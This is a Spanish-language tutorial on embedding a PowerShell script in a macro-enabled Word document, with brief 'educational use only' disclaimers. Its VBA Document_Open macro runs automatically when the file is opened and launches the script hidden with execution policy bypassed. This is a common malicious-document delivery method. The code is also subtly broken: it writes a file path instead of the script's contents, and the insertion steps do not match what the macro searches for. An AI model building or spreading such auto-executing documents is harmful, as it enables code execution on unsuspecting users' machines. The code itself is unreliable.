# Cómo Incrustar y Ejecutar un Script desde un Documento de Word

Este tutorial explica cómo incrustar un script en un documento de Word de manera que el archivo `.docm` contenga tanto el contenido de Word como el script, y luego ejecutar el script al abrir el documento.

**Advertencia:** Este procedimiento debe usarse únicamente en un entorno controlado con fines educativos. No se debe utilizar de manera maliciosa ni en sistemas no autorizados.

## Pasos para Incrustar y Ejecutar un Script

### 1. Crear el Script

Primero, crea el script que deseas incrustar en el documento. Por ejemplo, puedes usar un script de PowerShell:

```powershell
# Crear un archivo PowerShell llamado 'script.ps1'
echo "Write-Host '¡Sistema comprometido!'" > script.ps1
```
## 2. Crear un Documento de Word con una Macro

### Abre Microsoft Word

1. Inicia Microsoft Word y crea un nuevo documento en blanco.

### Accede a las Macros

1. Ve a la pestaña **"Desarrollador"**. Si no ves esta pestaña, actívala en **"Archivo"** > **"Opciones"** > **"Personalizar cinta de opciones"** y marca **"Desarrollador"**.

### Crear una Macro

1. Haz clic en **"Macros"** en la pestaña Desarrollador y luego en **"Grabar macro"**.
2. Asigna un nombre a la macro (por ejemplo, `ExtractAndRunScript`) y asegúrate de que el almacenamiento sea **"Este documento"**.

### Escribir el Código de la Macro

1. Haz clic en **"Visual Basic"** en la pestaña Desarrollador para abrir el Editor de VBA.
2. En el Editor de VBA, encuentra el módulo de la macro que acabas de crear (`ThisDocument`).
3. Sustituye el contenido con el siguiente código para extraer y ejecutar el script:

    ```vba
    Private Sub Document_Open()
        Dim shp As Shape
        Dim fs As Object
        Dim tempPath As String

        ' Define la ruta temporal para el script
        tempPath = Environ("TEMP") & "\script.ps1"
        
        ' Recorre todos los objetos de la forma en el documento
        For Each shp In ActiveDocument.Shapes
            If shp.Type = msoLinkedPicture Or shp.Type = msoPicture Then
                If shp.LinkFormat.SourceFullName Like "*.ps1" Then
                    ' Copia el archivo al directorio temporal
                    shp.Select
                    Selection.CopyAsPicture
                    Set fs = CreateObject("Scripting.FileSystemObject")
                    fs.CreateTextFile tempPath, True
                    Open tempPath For Binary Access Write As #1
                    Put #1, , shp.LinkFormat.SourceFullName
                    Close #1
                    ' Ejecuta el script
                    Shell "powershell.exe -ExecutionPolicy Bypass -File """ & tempPath & """", vbHide
                    Exit Sub
                End If
            End If
        Next shp
    End Sub
    ```

    **Explicación:**
    - `Document_Open()`: Ejecuta cuando se abre el documento.
    - Recorre todas las formas en el documento buscando imágenes o archivos vinculados.
    - Copia el archivo de script a una ubicación temporal y lo ejecuta usando PowerShell.

### Insertar el Script en el Documento

1. Ve a la pestaña **"Insertar"** y selecciona **"Objeto"** > **"Texto del archivo"**.
2. Selecciona el archivo del script (por ejemplo, `script.ps1`) y haz clic en **"Insertar"**.
3. Esto incrustará el script en el documento de Word como un objeto.

### Guardar el Documento con la Macro

1. Guarda el documento como un archivo habilitado para macros (`.docm`). Usa **"Guardar como"** y selecciona **"Documento habilitado para macros de Word (*.docm)"**.

## Consideraciones Importantes

- **Seguridad y Ética:** El uso de macros para ejecutar scripts debe realizarse en un entorno controlado y con fines educativos. Asegúrate de tener permisos para realizar estas pruebas y no distribuyas estos documentos sin el consentimiento adecuado.

- **Configuración de Seguridad en Word:** Microsoft Word tiene configuraciones de seguridad para prevenir la ejecución de macros automáticamente. Para fines de prueba, asegúrate de que las macros estén habilitadas en el entorno donde se va a realizar la prueba.

## Ejemplo Final

Cuando el usuario abra el documento `.docm`, la macro se ejecutará y buscará el script incrustado en el documento. Luego, lo extraerá y lo ejecutará automáticamente.
